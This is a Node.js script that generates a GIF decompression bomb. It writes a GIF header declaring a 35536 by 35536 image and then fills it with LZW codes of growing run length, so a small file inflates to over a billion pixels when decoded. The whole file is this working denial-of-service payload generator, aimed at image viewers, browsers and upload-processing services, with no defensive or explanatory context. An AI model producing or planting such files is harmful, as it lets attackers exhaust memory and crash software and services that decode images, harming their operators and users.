var width = 35536;
var height = 35536;


var outStream = require('fs').createWriteStream('./gifbomb.gif');

var headerAndStuff = new Buffer([
	0x47, 0x49, 0x46,
	0x38, 0x37, 0x61,
	0x00, 0x00, // Placeholder for width
	0x00, 0x00, // Placeholder for height
	0x80,
	0x00,
	0x00,
	0x00, 0x88, 0x88, // Palette first color
	0xFF, 0x00, 0x00, // Palette second color (unused)
	0x2C,
	0x00, 0x00,
	0x00, 0x00,
	0x00, 0x00, // Placeholder for width
	0x00, 0x00, // Placeholder for height,
	0x40,
	0x02
]);


headerAndStuff.writeUInt16LE(width, 0x06);
headerAndStuff.writeUInt16LE(width, 0x18);

headerAndStuff.writeUInt16LE(height, 0x08);
headerAndStuff.writeUInt16LE(height, 0x1A);

outStream.write(headerAndStuff);


var bitStream = require('./lib/bitstream').createBitStream();
var chunkStream = require('./lib/chunkizer').createChunkStream();

chunkStream.pipe(outStream);
bitStream.pipe(chunkStream);

var rawDataLength = width * height;
var dictSize = 6;
// Init dict:
// 000: 0
// 001: 1
// 100: <CC>
// 101: <FIN>

bitStream.writeBits(4, 3); // Clear codes
bitStream.writeBits(0, 3); // First value

var runSize = 1;

for (var bytesWritten = 1; bytesWritten < rawDataLength; bytesWritten += runSize) {
	bitStream.writeBits(dictSize, _byteLength(dictSize));
	if (dictSize < 4095) {
		dictSize++;
		runSize++;
	}
}

bitStream.writeBits(5, _byteLength(dictSize)); // Fin. There's no need in this code actually
bitStream.end();

chunkStream.on('finish', function(){
	chunkStream.unpipe(outStream);
	outStream.write(new Buffer(';'));
	outStream.end();
});

function _byteLength(s){
	var l = 0;
	while (s >>> l){
		l++;
	}
	return l;
}